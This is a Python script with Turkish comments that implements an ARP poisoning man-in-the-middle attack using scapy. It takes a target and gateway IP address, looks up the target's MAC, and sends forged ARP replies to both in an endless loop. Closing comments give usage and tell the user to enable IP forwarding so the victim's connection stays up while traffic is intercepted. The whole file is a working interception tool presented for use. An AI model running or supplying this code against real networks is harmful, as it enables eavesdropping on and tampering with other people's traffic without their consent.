import scapy.all as scapy
#network aglari icin ozellestirilmis paketler uretmeye yarayan kutuphane
import time
# zamanla ilgili islemler yapmak icin kullandigimiz kutuphane
import optparse
# kullanicidan girdi almak kullanilan kutuphane

def kullanici_girdisi():
    parse_object = optparse.OptionParser()  # obje olusturduk
    parse_object.add_option("-t", "--target", dest="target_ip", help="hedef ip adresi giriniz")
# objemize 1. hedef ip adresi secenegini ekleyip dest ve help degerlerini atadik
    parse_object.add_option("-g", "--gateway", dest="gateway_ip", help="hedef ip adresi giriniz")
# objemize 2. hedef ip adresi secenegini ekleyip dest ve help degerlerini atadik
    girdiler = parse_object.parse_args()[0]
# kullanici girdileri yazmadigi zaman ekrana girilecek mesajlari yazacak kosul yapisi
    if not girdiler.target_ip:
        print("1. hedef ip adresini gir!")

    if not girdiler.gateway_ip:
        print("1. hedef ip adresini gir!")

    return girdiler # kosullar saglanmissa alinan degerleri donduruyoruz.


# alinan degerleri girdiler adli degiskene atadik.

def mac_adresi_al(ip):
    istek_paketi = scapy.ARP(pdst=ip)
# ip adresine istek yapmak icin ARP metodunu kullaniyoruz. metodun icine ip adresini(pdst) ye atiyoruz.
    yayin_paketi = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
# agda yayin icin Ether ozelliginin icine default mac adresi giriyoruz
    kombine_paket = yayin_paketi/istek_paketi
# iki paketi birlestirip kombine_paket adli bir degiskene atiyoruz
    cevap = scapy.srp(kombine_paket, timeout=1, verbose=False)[0] # sadece cevaplari almak icin [0] kullandik
# paketleri srp ozelligiyle gonderip alinan sonucu cevaplar adli bir degiskene kaydediyoruz.
# #(timeout ozelligi cevap almadigi zaman 1 saniye bekleye ayarliyoruz)
    return cevap[0][1].hwsrc
# cevabin icinden hwsrc(ARPSourceMACField) yani mac adresini al ve dondur.

def arp_zehirleme(hedef1_ip,hedef2_ip):

    hedef_mac_adresi = mac_adresi_al(hedef1_ip)
# girilen hedef_ip adresinin mac adresini almak icin fonksiyonu calistirip degiskene atiyoruz
    arp_cevap = scapy.ARP(op=2, pdst=hedef1_ip, hwdst=hedef_mac_adresi, psrc=hedef2_ip)
# arp cevabi olusturmak icin op(ShortEnumField) yi 2 ye ayarliyoruz.
# pdst(IPField) ye hedef ip adresini yaziyoruz.
# hwdst(MACField) ye hedef mac adresini yaziyoruz.
# psrc(SourceIPField) ye 2. hedef ip adresini yaziyoruz.
    scapy.send(arp_cevap, verbose=False) # paketi gonderiyoruz.

#kullanicidan aldigimiz degerleri degiskenlere atadik.
kullanici_ip = kullanici_girdisi()
kullanici_hedef1_ip = kullanici_ip.target_ip
kullanici_hedef2_ip = kullanici_ip.gateway_ip

# 3 saniyede bir iki hedefede surekli ayri ayri zehirleme saldirisi yapan fonksiyonlari calistiriyoruz.
while True:

    arp_zehirleme(kullanici_hedef1_ip,kullanici_hedef2_ip)
    arp_zehirleme(kullanici_hedef2_ip,kullanici_hedef1_ip)
    print("Paketler gonderildi")
    time.sleep(3)

# programi calistirmadan hedefin internet baglantisinin kopmamasi icin ipforward islemini yapmayi unutmayin.
# ipforward islemi icin terminale "echo 1 >/proc/sys/net/ipv4/ip_forward" komutunu girin.
# kullanim = python ortadaki-adam.py -t {1.hedef ip adresi} -g {2.hedef ip adresi}
# ornek = python ortadaki adam -t 10.0.2.8 -g 10.0.2.1
# -----------------------------ahmetfurkansonmez12@gmail.com----------------------------
